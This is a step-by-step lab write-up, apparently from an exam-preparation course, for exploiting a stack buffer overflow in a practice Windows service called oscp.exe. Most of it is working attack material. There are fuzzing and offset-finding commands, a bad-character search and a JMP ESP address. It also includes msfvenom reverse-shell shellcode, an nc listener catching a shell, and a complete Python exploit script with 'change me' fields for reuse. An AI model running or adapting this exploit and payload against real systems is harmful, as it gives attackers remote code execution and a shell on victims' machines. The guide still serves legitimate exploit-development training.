# Buffer Overflow (Task 6)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
  * [Repeat Me](#repeat-me)
  * [Gotchas](#gotchas)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.194.204
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /workarea /v:$TARGET
```
```bash
cd exploits
vim fuzzer.py # update the IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.194.204
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[+] Sent: 800 bytes
[+] Sent: 900 bytes
[+] Sent: 1000 bytes
[+] Sent: 1100 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l ???

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
!mona findmsp -distance ???

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 1500
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x0183f622 (length 1500 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0048394a (length 1500 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x00484d7a (length 1500 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x35694234 (offset 1034) # <-- LOOK AT THIS
0BADF00D       ESP (0x0183fa30) points at offset 1038 in normal pattern (length 462)
0BADF00D       EBP contains normal pattern : 0x69423369 (offset 1030)
0BADF00D       EBX contains normal pattern : 0x42326942 (offset 1026)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 1500 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x0183f454 to 0x01840010 (0x00000bbc bytes)
0BADF00D       0x0183f624 : Contains normal cyclic pattern at ESP-0x40c (-1036) : offset 2, length 1498 (-> 0x0183fbfd : ESP+0x1ce)
0BADF00D   [+] Examining stack (+- 1500 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x0183f454 to 0x01840010 (0x00000bbc bytes)
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:04.181000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: 1034, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a ???

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0193fa30                 Corruption after 7 bytes   00 08 09 2c 2d ad ae       normal                     Stack
```

```bash
# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 019EFA30, "\x00\x08\x2c\xad"

vim exploit.py # BADCHARS = "\x00\x08\x2c\xad"
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x08\x2c\xad"

# output
0BADF00D   [+] This mona.py action took 0:00:00.436000
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x08\x2c\xad"

           ---------- Mona command started on 2021-08-27 21:51:44 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x08\x2c\xad"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
75280000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... 
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.483000
```

```bash
# ADDRESS: "\x62\x50\x11\xaf" # address of JMP instruction
# RETN: "\xaf\x11\x50\x62" # address of JMP instrucion, in Little Endian
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
ip address
LHOST=10.10.194.204 # change me
BADCHARS="\x00\x08\x2c\xad" # change me
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
PAYLOAD =  b""
PAYLOAD += b"\xba\x4e\x5a\x2f\xdb\xdb\xc0\xd9\x74\x24\xf4\x5d"
PAYLOAD += b"\x31\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x1b"
PAYLOAD += b"\x54\xcd\x2e\x5f\x80\x93\xd1\x9f\x51\xf4\x58\x7a"
PAYLOAD += b"\x60\x34\x3e\x0f\xd3\x84\x34\x5d\xd8\x6f\x18\x75"
PAYLOAD += b"\x6b\x1d\xb5\x7a\xdc\xa8\xe3\xb5\xdd\x81\xd0\xd4"
PAYLOAD += b"\x5d\xd8\x04\x36\x5f\x13\x59\x37\x98\x4e\x90\x65"
PAYLOAD += b"\x71\x04\x07\x99\xf6\x50\x94\x12\x44\x74\x9c\xc7"
PAYLOAD += b"\x1d\x77\x8d\x56\x15\x2e\x0d\x59\xfa\x5a\x04\x41"
PAYLOAD += b"\x1f\x66\xde\xfa\xeb\x1c\xe1\x2a\x22\xdc\x4e\x13"
PAYLOAD += b"\x8a\x2f\x8e\x54\x2d\xd0\xe5\xac\x4d\x6d\xfe\x6b"
PAYLOAD += b"\x2f\xa9\x8b\x6f\x97\x3a\x2b\x4b\x29\xee\xaa\x18"
PAYLOAD += b"\x25\x5b\xb8\x46\x2a\x5a\x6d\xfd\x56\xd7\x90\xd1"
PAYLOAD += b"\xde\xa3\xb6\xf5\xbb\x70\xd6\xac\x61\xd6\xe7\xae"
PAYLOAD += b"\xc9\x87\x4d\xa5\xe4\xdc\xff\xe4\x60\x10\x32\x16"
PAYLOAD += b"\x71\x3e\x45\x65\x43\xe1\xfd\xe1\xef\x6a\xd8\xf6"
PAYLOAD += b"\x10\x41\x9c\x68\xef\x6a\xdd\xa1\x34\x3e\x8d\xd9"
PAYLOAD += b"\x9d\x3f\x46\x19\x21\xea\xc9\x49\x8d\x45\xaa\x39"
PAYLOAD += b"\x6d\x36\x42\x53\x62\x69\x72\x5c\xa8\x02\x19\xa7"
PAYLOAD += b"\x3b\x27\xd6\x47\x0a\x5f\xe4\x87\x6c\x1b\x61\x61"
PAYLOAD += b"\x04\x4b\x24\x3a\xb1\xf2\x6d\xb0\x20\xfa\xbb\xbd"
PAYLOAD += b"\x63\x70\x48\x42\x2d\x71\x25\x50\xda\x71\x70\x0a"
PAYLOAD += b"\x4d\x8d\xae\x22\x11\x1c\x35\xb2\x5c\x3d\xe2\xe5"
PAYLOAD += b"\x09\xf3\xfb\x63\xa4\xaa\x55\x91\x35\x2a\x9d\x11"
PAYLOAD += b"\xe2\x8f\x20\x98\x67\xab\x06\x8a\xb1\x34\x03\xfe"
PAYLOAD += b"\x6d\x63\xdd\xa8\xcb\xdd\xaf\x02\x82\xb2\x79\xc2"
PAYLOAD += b"\x53\xf9\xb9\x94\x5b\xd4\x4f\x78\xed\x81\x09\x87"
PAYLOAD += b"\xc2\x45\x9e\xf0\x3e\xf6\x61\x2b\xfb\x16\x80\xf9"
PAYLOAD += b"\xf6\xbe\x1d\x68\xbb\xa2\x9d\x47\xf8\xda\x1d\x6d"
PAYLOAD += b"\x81\x18\x3d\x04\x84\x65\xf9\xf5\xf4\xf6\x6c\xf9"
PAYLOAD += b"\xab\xf7\xa4"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.194.204] 49235
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.194.204" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW6 " # change me; vulnerable function of target
OFFSET = 1034 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x08\x2c\xad" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\xd9\xea\xbb\xa6\x1e\x2f\xe8\xd9\x74\x24\xf4\x5a"
PAYLOAD += b"\x31\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x64"
PAYLOAD += b"\x1a\xcd\x1d\x94\xcb\x93\xde\x64\x0c\xf4\x57\x81"
PAYLOAD += b"\x3d\x34\x03\xc2\x6e\x84\x47\x86\x82\x6f\x05\x32"
PAYLOAD += b"\x10\x1d\x82\x35\x91\xa8\xf4\x78\x22\x80\xc5\x1b"
PAYLOAD += b"\xa0\xdb\x19\xfb\x99\x13\x6c\xfa\xde\x4e\x9d\xae"
PAYLOAD += b"\xb7\x05\x30\x5e\xb3\x50\x89\xd5\x8f\x75\x89\x0a"
PAYLOAD += b"\x47\x77\xb8\x9d\xd3\x2e\x1a\x1c\x37\x5b\x13\x06"
PAYLOAD += b"\x54\x66\xed\xbd\xae\x1c\xec\x17\xff\xdd\x43\x56"
PAYLOAD += b"\xcf\x2f\x9d\x9f\xe8\xcf\xe8\xe9\x0a\x6d\xeb\x2e"
PAYLOAD += b"\x70\xa9\x7e\xb4\xd2\x3a\xd8\x10\xe2\xef\xbf\xd3"
PAYLOAD += b"\xe8\x44\xcb\xbb\xec\x5b\x18\xb0\x09\xd7\x9f\x16"
PAYLOAD += b"\x98\xa3\xbb\xb2\xc0\x70\xa5\xe3\xac\xd7\xda\xf3"
PAYLOAD += b"\x0e\x87\x7e\x78\xa2\xdc\xf2\x23\xab\x11\x3f\xdb"
PAYLOAD += b"\x2b\x3e\x48\xa8\x19\xe1\xe2\x26\x12\x6a\x2d\xb1"
PAYLOAD += b"\x55\x41\x89\x2d\xa8\x6a\xea\x64\x6f\x3e\xba\x1e"
PAYLOAD += b"\x46\x3f\x51\xde\x67\xea\xf6\x8e\xc7\x45\xb7\x7e"
PAYLOAD += b"\xa8\x35\x5f\x94\x27\x69\x7f\x97\xed\x02\xea\x62"
PAYLOAD += b"\x66\x27\xe3\x8c\xc7\x5f\xf1\x4c\x29\x1b\x7c\xaa"
PAYLOAD += b"\x43\x4b\x29\x65\xfc\xf2\x70\xfd\x9d\xfb\xae\x78"
PAYLOAD += b"\x9d\x70\x5d\x7d\x50\x71\x28\x6d\x05\x71\x67\xcf"
PAYLOAD += b"\x80\x8e\x5d\x67\x4e\x1c\x3a\x77\x19\x3d\x95\x20"
PAYLOAD += b"\x4e\xf3\xec\xa4\x62\xaa\x46\xda\x7e\x2a\xa0\x5e"
PAYLOAD += b"\xa5\x8f\x2f\x5f\x28\xab\x0b\x4f\xf4\x34\x10\x3b"
PAYLOAD += b"\xa8\x62\xce\x95\x0e\xdd\xa0\x4f\xd9\xb2\x6a\x07"
PAYLOAD += b"\x9c\xf8\xac\x51\xa1\xd4\x5a\xbd\x10\x81\x1a\xc2"
PAYLOAD += b"\x9d\x45\xab\xbb\xc3\xf5\x54\x16\x40\x15\xb7\xb2"
PAYLOAD += b"\xbd\xbe\x6e\x57\x7c\xa3\x90\x82\x43\xda\x12\x26"
PAYLOAD += b"\x3c\x19\x0a\x43\x39\x65\x8c\xb8\x33\xf6\x79\xbe"
PAYLOAD += b"\xe0\xf7\xab"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
